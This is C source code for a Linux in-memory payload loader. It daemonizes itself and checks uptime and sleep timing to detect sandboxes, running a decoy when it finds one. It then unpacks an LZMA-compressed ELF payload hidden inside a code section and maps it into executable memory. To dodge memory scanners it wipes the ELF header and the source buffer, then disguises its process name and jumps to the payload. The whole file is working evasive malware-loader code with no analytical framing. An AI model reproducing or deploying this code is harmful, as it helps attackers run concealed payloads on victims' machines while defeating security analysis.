#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <dlfcn.h>
#include <unistd.h>
#include "loader.h"
#include "hidden.h"
#include "sandbox_check.h"
#include "compression.h"
#include "payload.h"

#ifdef DEBUG
int dbug_level_ = 2;
#endif

static void* load_segments(char *elf_format_data,unsigned long *map_size,unsigned long *entry_addr)
{
    ELFInfo_t elfinfo;
    int counter = 0;
    int tempOffsetCounter = 0;
    int c2 = 0;
    unsigned long minva = (unsigned long)-1;
    unsigned long maxva = 0;
    unsigned long total_size = 0;
    unsigned long entry_offset = 0;
    char **argv = {NULL};
    unsigned long entry;
    void *base_addr = NULL;


    memset(&elfinfo,0,sizeof(elfinfo));
    elfinfo.Header = (Elf_Ehdr*)elf_format_data;

    // vertify that the data is an elf file
    if( elf_format_data[0] != '\x7f' || elf_format_data[1] != 'E' || elf_format_data[2] != 'L' || elf_format_data[3] != 'F' ){
        DLX(0,printf("\tnot an elf file\n"));
        goto cleanup;
    }
    DLX(0,printf("\tvalid elf file magic number\n"));

    if(elfinfo.Header->e_type != ET_DYN){ //ET_DYN
        DLX(0,printf("\tELF Type isn't Shared object file type\n"));
        goto cleanup;
    }
    //.so .elf(pie)
    DLX(0,printf("\tELF Object Data: %p\n", elf_format_data));
    DLX(0,printf("\tELF Type: %d\n", elfinfo.Header->e_type));
    DLX(0,printf("\tELF Machine: %d\n", elfinfo.Header->e_machine));
    DLX(0,printf("\tELF Version: %d\n", elfinfo.Header->e_version));
    DLX(0,printf("\tELF Entry: 0x%lx\n", elfinfo.Header->e_entry));
    DLX(0,printf("\tELF ProgramHeaderOffset: 0x%lx\n", elfinfo.Header->e_phoff));
    DLX(0,printf("\tELF SectionHeaderOffset: 0x%lx\n", elfinfo.Header->e_shoff));
    DLX(0,printf("\tELF Flags: 0x%x\n", elfinfo.Header->e_flags));
    DLX(0,printf("\tELF Header Size: %d\n", elfinfo.Header->e_ehsize));
    DLX(0,printf("\tELF Program Header Entry Size: %d\n", elfinfo.Header->e_phentsize));
    DLX(0,printf("\tELF Program Header Entry Count: %d\n", elfinfo.Header->e_phnum));
    DLX(0,printf("\tELF Section Header Entry Size: %d\n", elfinfo.Header->e_shentsize));
    DLX(0,printf("\tELF Section Header Entry Count: %d\n", elfinfo.Header->e_shnum));
    DLX(0,printf("\tELF Section Header Table Index Entry: %d\n", elfinfo.Header->e_shstrndx));

    /* Set all the headers and sizes */
    elfinfo.progHeader = (Elf_Phdr*)(elf_format_data + elfinfo.Header->e_phoff);
    elfinfo.sectHeader = (Elf_Shdr*)(elf_format_data + elfinfo.Header->e_shoff);
    elfinfo.progHeaderNum = elfinfo.Header->e_phnum;
    elfinfo.sectHeaderNum = elfinfo.Header->e_shnum;

    /* calc minva maxva */
    DLX(0,printf("\tWorking with program headers, Count: %d\n", elfinfo.progHeaderNum));
    for (counter = 0; counter < elfinfo.progHeaderNum; counter++){
        switch (elfinfo.progHeader[counter].p_type)
        {
        case PT_LOAD:
            if(minva > elfinfo.progHeader[counter].p_vaddr){
                minva = elfinfo.progHeader[counter].p_vaddr;
            }
            if(maxva  < (elfinfo.progHeader[counter].p_vaddr + elfinfo.progHeader[counter].p_memsz) ){
                maxva  = (elfinfo.progHeader[counter].p_vaddr + elfinfo.progHeader[counter].p_memsz);
            }
            break;
        default:
            break;
        }
    }

    minva = TRUNC_PG(minva);
    maxva = ROUND_PG(maxva);

    *map_size = total_size = maxva - minva;
    base_addr = mmap(NULL,total_size,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(base_addr,0,total_size);//init .bss

    if(base_addr == NULL || base_addr ==MAP_FAILED){
        DLX(0,printf("\tmmap error\n"));
        goto cleanup;
    }

    entry_offset = elfinfo.Header->e_entry - minva;
    *entry_addr = entry = (unsigned long)(base_addr + entry_offset);

    DLX(0,printf("\tbase_addr: %p\n",  base_addr));
    DLX(0,printf("\tminva: 0x%lX\n",minva));
    DLX(0,printf("\tmaxva: 0x%lX\n",  maxva));
    DLX(0,printf("\ttotal_size: 0x%lX\n",  total_size));
    DLX(0,printf("\tentry_offset: 0x%lX\n",  entry_offset));
    DLX(0,printf("\tentry: 0x%lx\n",  entry));

    //mmap
    for (counter = 0; counter < elfinfo.progHeaderNum; counter++){
        switch (elfinfo.progHeader[counter].p_type)
        {
        case PT_LOAD:
            memcpy(base_addr+(elfinfo.progHeader[counter].p_vaddr - minva),elf_format_data+elfinfo.progHeader[counter].p_offset,elfinfo.progHeader[counter].p_filesz);
            break;
        }
    }
    
    return base_addr;
cleanup:
    if(base_addr != NULL && base_addr != MAP_FAILED){
        munmap(base_addr,total_size);
    }
    return NULL;
}

static void* init_stack(int exec_argc, char *exec_argv[], char **exec_environ,void *base_addr)
{
    ELFInfo_t elfinfo;
    
    void *stack = mmap(NULL,STACK_SIZE,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS,-1,0);
    if(stack == NULL || stack == MAP_FAILED){
        return NULL;
    }

    memset(&elfinfo,0,sizeof(elfinfo));
    elfinfo.Header = (Elf_Ehdr*)base_addr;

    unsigned long *sp = (unsigned long*)((unsigned long)(stack) + STACK_SIZE - 16*PAGE_SIZE);
    //point to top stack
    void *res = (void*)sp;

    //argv init
    *sp++ = exec_argc;
    for(int i = 0; exec_argv[i]; ++i) {
        char *str = malloc(strlen(exec_argv[i]) + 1);
        memset(str,0,strlen(exec_argv[i])+1);
        strcpy(str,exec_argv[i]);
        *sp++ = (unsigned long)str;
    }
    *sp++ = 0;

    //environ init
    int environ_idx = 0;
    for(; exec_environ[environ_idx]; ++environ_idx) {
        if(strchr(exec_environ[environ_idx], '_') != exec_environ[environ_idx]) { 
            char *str = malloc(strlen(exec_environ[environ_idx]) + 1);
            memset(str,0,strlen(exec_environ[environ_idx])+1);
            strcpy(str,exec_environ[environ_idx]);

            *sp++ = (unsigned long)str;
        } else {
            char *environ = (char*)malloc(strlen(exec_argv[0] + 3));
            sprintf(environ, "_=%s", exec_argv[0]);
            *sp++ = (unsigned long)environ;
        }
        
    }
    *sp++ = 0;

    //auxiliary vector entries
    *((Elf_auxv_t*)sp) = (Elf_auxv_t){ .a_type = AT_RANDOM, .a_un.a_val = (unsigned long)(stack) + STACK_SIZE - 16};
    sp = (unsigned long*)((Elf_auxv_t*)sp + 1);
    *((Elf_auxv_t*)sp) = (Elf_auxv_t){ .a_type = AT_PAGESZ, .a_un.a_val = PAGE_SIZE};
    sp = (unsigned long*)((Elf_auxv_t*)sp + 1);
    *((Elf_auxv_t*)sp) = (Elf_auxv_t){ .a_type = AT_PHDR,   .a_un.a_val = (unsigned long)(base_addr) + elfinfo.Header->e_phoff};
    sp = (unsigned long*)((Elf_auxv_t*)sp + 1);
    *((Elf_auxv_t*)sp) = (Elf_auxv_t){ .a_type = AT_PHENT,  .a_un.a_val = elfinfo.Header->e_phentsize};
    sp = (unsigned long*)((Elf_auxv_t*)sp + 1);
    *((Elf_auxv_t*)sp) = (Elf_auxv_t){ .a_type = AT_PHNUM,  .a_un.a_val = elfinfo.Header->e_phnum};
    sp = (unsigned long*)((Elf_auxv_t*)sp + 1);
    *((Elf_auxv_t*)sp) = (Elf_auxv_t){ .a_type = AT_NULL};

    //destroy elf header,prevent memory scanning
    memset(elfinfo.Header,0,sizeof(Elf_Ehdr));

    int argc = *(unsigned long*)res, i;
    char **argv;
    char **environ;
    Elf_auxv_t* elf_auxv_t;
    DLX(0,printf("\tstack => %p\n", res));
    DLX(0,printf("\targc => %d\n", argc));

    argv = ((char**)res) + 1;
    for(i = 0; i < argc; ++i) {
        DLX(0,printf("\targv[%d] = %s\n", i, argv[i])); 
    }

    environ = argv + argc + 1;
    for(i = 0; environ[i]; ++i) { 
        DLX(0,printf("\tenviron[%d] = %s\n", i, environ[i])); 
    }

    elf_auxv_t = (Elf_auxv_t*)(environ + i + 1);
    for(i = 0; elf_auxv_t[i].a_type != AT_NULL; ++i) { 
        DLX(0,printf("\tauxiliary[%d].a_type = %#lx, auxiliary[%d].a_un.a_val = %#lx\n", i, elf_auxv_t[i].a_type, i, elf_auxv_t[i].a_un.a_val)); 
    }

    return res;
}

static void init_registers_and_run_target_elf(unsigned long entry, void *stack){
#if defined __x86_64__ 
    __asm__ volatile(
        "mov %0, %%rsp;"
        "xor %%rdx, %%rdx;"
        "jmp *%1"
        :
        : "r"(stack), "r"(entry)
        : "rdx"
    );
#elif defined __i386__
    __asm__ volatile(
        "mov %0, %%esp;"
        "xor %%edx, %%edx;"
        "jmp *%1"
        :
        : "r"(stack), "r"(entry)
        : "edx"
    );
#else
    DLX(0,printf("\tUnsupported architecture\n"));
#endif
}

int loader(char *data,size_t data_len,int argc,char **argv,char **env)
{
    unsigned long total_size;
    unsigned long entry_addr;
    void *stack;
    void* base_addr = load_segments(data,&total_size,&entry_addr);

    //prevent memory scanning 
    memset(data,0,data_len);
    
    stack = init_stack(argc,argv,env,base_addr);

    //process name change
    hidden_process(argc,argv,env);

    init_registers_and_run_target_elf(entry_addr,stack);
    //not return
}

int get_lzma_compressed_payload_from_code(char *buf,unsigned long size)
{
    unsigned char *payload_code = (unsigned char*)payload;
    unsigned long i = 0;
    while(payload_code[i*2]!=0xc3)
    {
        if (i == size){
            return -1;
        }
        buf[i] = payload_code[i*2+1];
        i++;
    }

    return 0;
}

void *get_lzma_compressed_payload_data()
{

    unsigned long buf_size = 1024*1024;//1MB

    while(1){
        char *buf = malloc(buf_size);
        if (get_lzma_compressed_payload_from_code(buf,buf_size) == 0){
            return buf;
        }
        free(buf);
        buf_size *= 2;
    }

    return NULL;
}

int main(int argc,char **argv,char **env)
{
    char *decompressd_data;
#ifndef DEBUG
    int pid = fork();
    
    if(pid < 0) return -1;

    if(pid != 0){//parent
        return 0;
    }

    if( setsid() < 0 )
    {
        return( 2 );
    }

    //child
    for(int i = 0;i<1024;i++){
        close(i);
    }
#endif

#ifdef SANDBOX_CHECK
    uint64_t uptime_seconds = get_system_uptime_seconds();
    if(uptime_seconds < 60*SANDBOX_CHECK_UPTIME) {//<30 minutes
        payload(2010,222);
        return 0;
    }


    uint64_t time_to_sleep = SANDBOX_CHECK_TIME_TO_SLEEP;
    uint64_t cpu_frequency = get_cpu_frequency();//time accelerate
    if (cpu_frequency != 0){

        uint64_t start_tsc = rdtsc();
        sleep(time_to_sleep);
        uint64_t stop_tsc = rdtsc();

        uint64_t real_run_time = (stop_tsc - start_tsc)/(cpu_frequency*1E6);

        if(real_run_time + SANDBOX_CHECK_TIME_TO_SLEEP/2 < time_to_sleep){
            payload(2010,222);
            return 0;
        }
    }
#endif
    
    payload(211,987);

    char *compressed_data = get_lzma_compressed_payload_data();

    uint64_t data_decompressed_len = *(uint64_t*)(compressed_data);
    

    decompress_use_lzma(compressed_data,&decompressd_data);
    
    memset_compressd_data(compressed_data,0);
    
    loader(decompressd_data,data_decompressed_len,argc,argv,env);

    //not return
    return 0;
}

//int main_for_print_payload(int argc,char**argv)
int tmain(int argc,char**argv)
{
    FILE *file;
    long file_size;
    char *buffer;
    char *compressd_data;

    if(argc!=2)
    {
        printf("Usage:%s file\n",argv[0]);
        return 1;
    }

    file = fopen(argv[1], "rb");
    if (file == NULL) {
        perror("Error opening file");
        return -1;
    }
    
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    rewind(file);

    buffer = (char *)malloc(file_size);
    if (buffer == NULL) {
        perror("Error allocating memory");
        fclose(file);
        return 2;
    }
    fread(buffer, 1, file_size, file);

    compress_use_lzma(buffer,file_size,&compressd_data);
    
    print_lzma_compressd_payload(compressd_data);
    return 0;
}